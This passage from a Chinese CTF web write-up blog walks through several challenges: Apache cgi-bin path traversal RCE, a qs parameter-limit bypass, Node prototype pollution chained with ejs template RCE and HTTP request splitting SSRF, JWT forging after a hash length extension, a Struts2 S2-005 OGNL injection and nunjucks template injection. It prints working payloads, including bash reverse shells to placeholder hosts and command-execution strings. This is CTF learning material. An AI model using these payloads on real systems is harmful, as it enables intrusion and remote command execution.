<p>之后用<code>gzip ./phar2.phar</code>打个压缩包，然后改个后缀名为<code>jpg</code>即可上传。</p>
<p>然后使用<code>burpsuite</code>使用<code>phar</code>协议访问即可，如下得到<code>flag</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220804153914770.png" alt="image-20220804153914770"></p>

        <h2 id="二、ez-rce"   >
          <a href="#二、ez-rce" class="heading-link"><i class="fas fa-link"></i></a><a href="#二、ez-rce" class="headerlink" title="二、ez_rce"></a>二、ez_rce</h2>
      <p>打开靶机啥也没有，<code>dirsearch</code>扫一波。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220804154756848.png" alt="image-20220804154756848"></p>
<p>有<code>/cgi-bin/</code>，而且名字<code>rce</code>，猜测<code>apache</code>的<code>cgi-bin</code>漏洞</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/419976985" >Apache49-50任意文件读取与RCE整理 - 知乎 (zhihu.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>直接<code>payload</code></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1</span><br><span class="line">echo;whoami;ida</span><br></pre></td></tr></table></div></figure>

<p>发现可以，那么直接<code>ls /</code>，查看启动脚本<code>run.sh</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220804155731252.png" alt="image-20220804155731252"></p>
<p>直接<code>cat</code>得到<code>flag</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220804155807904.png" alt="image-20220804155807904"></p>

        <h1 id="SECCONCTF2022"   >
          <a href="#SECCONCTF2022" class="heading-link"><i class="fas fa-link"></i></a><a href="#SECCONCTF2022" class="headerlink" title="SECCONCTF2022"></a>SECCONCTF2022</h1>
      
        <h2 id="一、skipinx"   >
          <a href="#一、skipinx" class="heading-link"><i class="fas fa-link"></i></a><a href="#一、skipinx" class="headerlink" title="一、skipinx"></a>一、skipinx</h2>
      
        <h3 id="1-源代码分析："   >
          <a href="#1-源代码分析：" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-源代码分析：" class="headerlink" title="1.源代码分析："></a>1.源代码分析：</h3>
      <p>在<code>index.js</code>中可以看到</p>
<figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> app = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>)();</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> FLAG = process.env.FLAG ?? <span class="string">&quot;SECCON&#123;dummy&#125;&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> PORT = <span class="number">3000</span>;</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&quot;/&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  req.query.proxy.includes(<span class="string">&quot;nginx&quot;</span>)</span><br><span class="line">    ? res.status(<span class="number">400</span>).sesnd(<span class="string">&quot;Access here directly, not via nginx :(&quot;</span>)</span><br><span class="line">    : res.send(<span class="string">`Congratz! You got a flag: <span class="subst">$&#123;FLAG&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(&#123; <span class="attr">port</span>: PORT, <span class="attr">host</span>: <span class="string">&quot;0.0.0.0&quot;</span> &#125;, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`Server listening at <span class="subst">$&#123;PORT&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<p>如果<code>req.query.proxy</code>这个列表中不包含<code>nginx</code>即输出<code>flag</code></p>
<p>然后再看<code>nginx</code>的配置<code>default.conf</code></p>
<figure class="highlight json"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">  listen 8080 default_server;</span><br><span class="line">  server_name nginx;</span><br><span class="line"></span><br><span class="line">  location / &#123;</span><br><span class="line">    set $args <span class="attr">&quot;$&#123;args&#125;&amp;proxy=nginx&quot;</span>;</span><br><span class="line">    proxy_pass http:<span class="comment">//web:3000;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>可以看到会默认给传入的<code>$args</code>进行拼接<code>proxy=nginx</code>，那么这样在<code>proxy</code>中就必定含有<code>nginx</code></p>

        <h3 id="2-漏洞分析"   >
          <a href="#2-漏洞分析" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-漏洞分析" class="headerlink" title="2.漏洞分析"></a>2.漏洞分析</h3>
      <p>源代码中调用的库为JS的标准库<code>req.query.proxy.includes(&quot;nginx&quot;)</code>，其<code>query</code>下的参数个数默认配置为1000，如果超过，就只会解析前1000个参数，在如下仓库：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/ljharb/qs/tree/main/dist" >qs/dist at main · ljharb/qs (github.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221114194250871.png" alt="image-20221114194250871"></p>
<p>所以我们可以这样写，当<code>proxy</code>的个数超过1000就会导致<code>index.js</code>代码中的拼接的<code>proxy=nginx</code>无法解析到，成功完成<code>proxy</code>的覆盖</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url/?proxy=a&amp;proxy=a&amp;proxy=a&amp;proxy=a&amp;proxy=a...</span><br></pre></td></tr></table></div></figure>

<p>但是<code>proxy</code>的个数也不能太多，太多的话会导致<code>url</code>太长，出现如下情况，这个是由于<code>nginx</code>的限制</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221114214652469.png" alt="image-20221114214652469"></p>
<p>那么我们改改即可</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url/?proxy=a&amp;m=a&amp;m=a&amp;m=a&amp;m=a...&amp;m=a...</span><br></pre></td></tr></table></div></figure>

<p>这样就会使得参数超过1000个但是<code>url</code>长度也不会太长。</p>

        <h1 id="西湖论剑2023"   >
          <a href="#西湖论剑2023" class="heading-link"><i class="fas fa-link"></i></a><a href="#西湖论剑2023" class="headerlink" title="西湖论剑2023"></a>西湖论剑2023</h1>
      
        <h2 id="real-ez-node"   >
          <a href="#real-ez-node" class="heading-link"><i class="fas fa-link"></i></a><a href="#real-ez-node" class="headerlink" title="real_ez_node"></a>real_ez_node</h2>
      
        <h3 id="原型链污染漏洞"   >
          <a href="#原型链污染漏洞" class="heading-link"><i class="fas fa-link"></i></a><a href="#原型链污染漏洞" class="headerlink" title="原型链污染漏洞"></a>原型链污染漏洞</h3>
      <p><code>./src/routes/index.js</code>中</p>
<p>首先在<code>copy</code>路径中，由于<code>safeobj.expand</code>存在原型链污染漏洞</p>
<figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">router.post(<span class="string">&#x27;/copy&#x27;</span>,<span class="function">(<span class="params">req,res</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> ip = req.connection.remoteAddress;</span><br><span class="line">    <span class="keyword">if</span> (!ip.includes(<span class="string">&#x27;127.0.0.1&#x27;</span>)) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">let</span> user = &#123;&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> index <span class="keyword">in</span> req.body)</span><br><span class="line">        <span class="keyword">if</span>(!index.includes(<span class="string">&quot;__proto__&quot;</span>))</span><br><span class="line">            safeobj.expand(user, index, req.body[index]);</span><br><span class="line">    <span class="comment">//.....</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></div></figure>

<p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html?page=1#reply-list" >深入理解 JavaScript Prototype 污染攻击 | 离别歌 (leavesongs.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>该函数<code>expand</code>代码如下</p>
<figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">expand: <span class="function"><span class="keyword">function</span> (<span class="params">obj, path, thing</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!path || <span class="keyword">typeof</span> thing === <span class="string">&#x27;undefined&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    obj = isObject(obj) &amp;&amp; obj !== <span class="literal">null</span> ? obj : &#123;&#125;;</span><br><span class="line">    <span class="keyword">var</span> props = path.split(<span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (props.length === <span class="number">1</span>) &#123;</span><br><span class="line">        obj[props.shift()] = thing;<span class="comment">//从左数取第一个</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">var</span> prop = props.shift();</span><br><span class="line">        <span class="keyword">if</span> (!(prop <span class="keyword">in</span> obj)) &#123;</span><br><span class="line">            obj[prop] = &#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">        _safe.expand(obj[prop], props.join(<span class="string">&#x27;.&#x27;</span>), thing);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>通过如下代码简单调试一下</p>
<p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12053" >关于Prototype Pollution Attack的二三事 - 先知社区 (aliyun.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> safeObj = <span class="built_in">require</span>(<span class="string">&quot;safe-obj&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;Before : &quot;</span> + &#123;&#125;.polluted);</span><br><span class="line">safeObj.expand(obj, <span class="string">&#x27;__proto__.polluted&#x27;</span>, <span class="string">&#x27;Yes! Its Polluted&#x27;</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;After : &quot;</span> + &#123;&#125;.polluted);</span><br></pre></td></tr></table></div></figure>

<p>结果如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230204164445320.png" alt="image-20230204164445320"></p>
<p>即可知道，该函数的作用就是将<code>obj.path</code>赋值为<code>thing</code>，使用的是递归方式进行相关属性的寻找赋值。</p>
<p>那么就可以通过该函数，给基类<code>object</code>添加某个属性，或者修改某个属性，从而造成所有的对象相关的属性都会被修改掉。</p>
<p>而对于题目中的<code>req.body[index]</code>，这个就是我们包的<code>POST</code>的数据，是可控的。</p>

        <h3 id="配合ejs进行RCE"   >
          <a href="#配合ejs进行RCE" class="heading-link"><i class="fas fa-link"></i></a><a href="#配合ejs进行RCE" class="headerlink" title="配合ejs进行RCE"></a>配合<code>ejs</code>进行<code>RCE</code></h3>
      <p>在<code>./src/app.js</code>中用到了<code>ejs</code>进行模板渲染</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230204165526170.png" alt="image-20230204165526170"></p>
<p>对于<code>ejs</code>进行渲染时，调用的是<code>compile </code>方法，结合原型链污染漏洞，可以造成<code>RCE</code>，可参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/248170#h3-1" >从 Lodash 原型链污染到模板 RCE-安全客 - 安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>即污染掉<code>compile</code>方法中的<code>opts.outputFunctionName</code>，那么在渲染时，就会将污染之后的字符串和<code>prepended</code>进行拼接，在之后渲染的时候就能够执行到污染的字符串中的<code>js</code>代码，完成<code>RCE</code>的利用。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230204165929533.png" alt="image-20230204165929533"></p>
<p>常见<code>POC</code></p>
<figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;outputFunctionName&quot;</span>:<span class="string">&quot;_tmp1;global.process.mainModule.require(\&#x27;child_process\&#x27;).execSync(&#x27;calc&#x27;);var __tmp2&quot;</span>&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;outputFunctionName&quot;</span>:<span class="string">&quot;_tmp1;global.process.mainModule.require(\&#x27;child_process\&#x27;).exec(&#x27;calc&#x27;);var __tmp2&quot;</span>&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;outputFunctionName&quot;</span>:<span class="string">&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/xxx/6666 0&gt;&amp;1\&quot;&#x27;);var __tmp2&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></div></figure>


        <h3 id="SSRF的利用"   >
          <a href="#SSRF的利用" class="heading-link"><i class="fas fa-link"></i></a><a href="#SSRF的利用" class="headerlink" title="SSRF的利用"></a>SSRF的利用</h3>
      <p>在前面的<code>copy</code>方法中有个<code>ip</code>检测</p>
<figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!ip.includes(<span class="string">&#x27;127.0.0.1&#x27;</span>)) <span class="keyword">return</span>;</span><br></pre></td></tr></table></div></figure>

<p>需要绕过这个检测才能进行原型链污染的漏洞利用，这里就用到了在某些<code>nodejs</code>版本下的<code>http.get()</code>这个方法的利用了。题目是<code>8.1.2</code>，可以自己用下述代码进行测试某些版本能不能用</p>
<figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">&#x27;/test&#x27;</span>,<span class="function">(<span class="params">req,res</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;get test&#x27;</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/curl&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> q = req.query.q;</span><br><span class="line">    <span class="keyword">if</span> (q) &#123;</span><br><span class="line">        <span class="keyword">var</span> url = <span class="string">&#x27;http://127.0.0.1:12345/?q=&#x27;</span> + q;</span><br><span class="line">        http.get(url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> server = app.listen(<span class="number">12345</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> host = server.address().address</span><br><span class="line">    <span class="keyword">var</span> port = server.address().port</span><br><span class="line"></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;应用实例，访问地址为 http://%s:%s&quot;</span>, host, port)</span><br><span class="line"></span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">module</span>.exports = app;</span><br></pre></td></tr></table></div></figure>

<p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.le31ei.top/2021/05/23/nodejs%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E4%B8%8Essrf/" >nodejs请求走私与ssrf | blog (le31ei.top)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>这个方法利用的原理就是<code>Unicode</code>转换的关系，详情见：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2894" >通过拆分攻击实现的SSRF攻击 - 先知社区 (aliyun.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>可以看到在<code>curl</code>路径中，使用到了<code>http.get()</code></p>
<figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//./src/routes/index.js</span></span><br><span class="line">router.get(<span class="string">&#x27;/curl&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> q = req.query.q;</span><br><span class="line">    <span class="keyword">var</span> url = <span class="string">&#x27;http://localhost:3000/?q=&#x27;</span> + q</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        http.get(url,<span class="function">(<span class="params">res1</span>)=&gt;</span>&#123; </span><br><span class="line">    <span class="comment">// ......</span></span><br></pre></td></tr></table></div></figure>

<p>那么使用脚本构造下走私的<code>Http</code>包即可，该脚本是战队里学弟写的</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line">data = <span class="string">&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1\&quot;&#x27;);var __tmp2&quot;</span></span><br><span class="line">data = <span class="string">f&quot;constructor.prototype.outputFunctionName=<span class="subst">&#123;quote(data)&#125;</span>&quot;</span></span><br><span class="line">req = <span class="string">&quot;1 HTTP/1.1\r\n\r\n&quot;</span></span><br><span class="line">req += <span class="string">&quot;POST /copy HTTP/1.1\r\n&quot;</span></span><br><span class="line">req += <span class="string">&quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;</span></span><br><span class="line">req += <span class="string">f&quot;Content-Length: <span class="subst">&#123;<span class="built_in">len</span>(data)&#125;</span>\r\n&quot;</span></span><br><span class="line">req += <span class="string">f&quot;\r\n<span class="subst">&#123;data&#125;</span>\r\n\r\n&quot;</span></span><br><span class="line">req = req.replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\u0120&#x27;</span>).replace(<span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\u010d&#x27;</span>).replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;\u010a&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(quote(req))</span><br></pre></td></tr></table></div></figure>

<p>设置一下<code>IP/PORT</code>即可反弹<code>Shell</code></p>
<p>需要注意的是，这个<code>SSRF</code>走私的数据包只能在内网中用，不能添加比如说<code>Host:</code>字段来出网。</p>

        <h1 id="CTF2023"   >
          <a href="#CTF2023" class="heading-link"><i class="fas fa-link"></i></a><a href="#CTF2023" class="headerlink" title="*CTF2023"></a>*CTF2023</h1>
      
        <h2 id="jwt2struts"   >
          <a href="#jwt2struts" class="heading-link"><i class="fas fa-link"></i></a><a href="#jwt2struts" class="headerlink" title="jwt2struts"></a>jwt2struts</h2>
      <p>访问之后给提示</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230729180147150.png" alt="image-20230729180147150"></p>
<p>接着访问</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230729180206893.png" alt="image-20230729180206893"></p>

        <h3 id="1-hash扩展长度攻击"   >
          <a href="#1-hash扩展长度攻击" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-hash扩展长度攻击" class="headerlink" title="1.hash扩展长度攻击"></a>1.hash扩展长度攻击</h3>
      <p>属于是hash扩展长度攻击了，参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/LYJ20010728/article/details/116779357" >https://blog.csdn.net/LYJ20010728/article/details/116779357</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>具体步骤如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230729180433572.png" alt="image-20230729180433572"></p>
<p>发送POST包如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230729180513310.png" alt="image-20230729180513310"></p>
<p>得到key为sk-he00lctf3r</p>
<p>结合最开始访问的提示，包括题目名称</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230729180551778.png" alt="image-20230729180551778"></p>
<p>应该是需要修改JWT令牌为admin，最开始访问网站抓包可以看到默认会给user的JWT令牌，那么现在有key，就可以生成admin的JWT令牌</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230729180733485.png" alt="image-20230729180733485"></p>

        <h3 id="2-JWT令牌"   >
          <a href="#2-JWT令牌" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-JWT令牌" class="headerlink" title="2.JWT令牌"></a>2.JWT令牌</h3>
      <p>按照如下步骤可对user的JWT令牌进行验证</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/zengjindong/p/14286529.html" >如何使用在线工具手动验证JWT签名 - 曾昊 - 博客园 (cnblogs.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/q95548854/article/details/103907825" >(64条消息) 全栈之初识JWT – Web安全的守护神_eyj0exaioijkv1qilcjhbgcioijiuzi1nij9.eyjyzwdpc_张兴华(MarsXH.Chang)的博客-CSDN博客</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>提取user的JWT令牌，用cyberchef的base64查看即可</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230729181008635.png" alt="image-20230729181008635"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230729181027419.png" alt="image-20230729181027419"></p>
<p>然后将user改为admin，base64得到JWT令牌的头部和载荷</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230729181229611.png" alt="image-20230729181229611"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230729181300249.png" alt="image-20230729181300249"></p>
<p>去掉其中的”=”号，然后依据头部(header).载荷(payload)的顺序准备进行加密，网站为<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://cryptii.com/" >Modular conversion, encoding and encryption online - cryptii</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230729181602274.png" alt="image-20230729181602274"></p>
<p>将得到的最终结果放入access_token中发送</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230729181807831.png" alt="image-20230729181807831"></p>
<p>返回了一个Location，访问如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230729182035159.png" alt="image-20230729182035159"></p>

        <h3 id="3-struts2框架漏洞"   >
          <a href="#3-struts2框架漏洞" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-struts2框架漏洞" class="headerlink" title="3.struts2框架漏洞"></a>3.struts2框架漏洞</h3>
      <p>结合题目提示，应该是struts2漏洞，依据如下网址挨个尝试POC</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_53972936/article/details/127590995" >(64条消息) 【渗透测试】Struts2系列漏洞_struts2漏洞_离陌lm的博客-CSDN博客</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>其中<strong>S2-005</strong>漏洞可以成功，成功执行命令，POC为</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; + (#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#foo=new java.lang.Boolean(&quot;false&quot;) ,#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;ls&#x27;).getInputStream())) + &#x27;</span><br></pre></td></tr></table></div></figure>

<p>其中ls即可随意更改执行命令，右键查看源代码即可看到返回的结果</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230729182336645.png" alt="image-20230729182336645"></p>
<p>输入命令env即可得到flag</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230729182410190.png" alt="image-20230729182410190"></p>

        <h1 id="DeconstruCTF"   >
          <a href="#DeconstruCTF" class="heading-link"><i class="fas fa-link"></i></a><a href="#DeconstruCTF" class="headerlink" title="DeconstruCTF"></a>DeconstruCTF</h1>
      
        <h2 id="gitcha"   >
          <a href="#gitcha" class="heading-link"><i class="fas fa-link"></i></a><a href="#gitcha" class="headerlink" title="gitcha"></a>gitcha</h2>
      <p>dirsearch发现有.git，泄露之后发现源码，审计代码，设置Cookie</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230806193032520.png" alt="image-20230806193032520"></p>
<p>可以通过document.进行设置</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.cookie=”SECRET_COOKIE_VALUE=thisisahugesecret″;=</span><br></pre></td></tr></table></div></figure>

<p>然后显示note信息的函数中存在nunjucks模板注入，也可以通过输入框输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;7+7&#125;&#125;</span><br></pre></td></tr></table></div></figure>

<p>来进行测试，如果返回结果14，则存在模板注入</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12264" >从一道题目学习Nunjucks模板 - 先知社区 (aliyun.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230806193102087.png" alt="image-20230806193102087"></p>
<p>如下payload执行代码，cat flag</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;range.constructor(&quot;return global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;cat flag&#x27;).toString()&quot;)()&#125;&#125;</span><br></pre></td></tr></table></div></figure>


        <h2 id="why-are-types-weird"   >
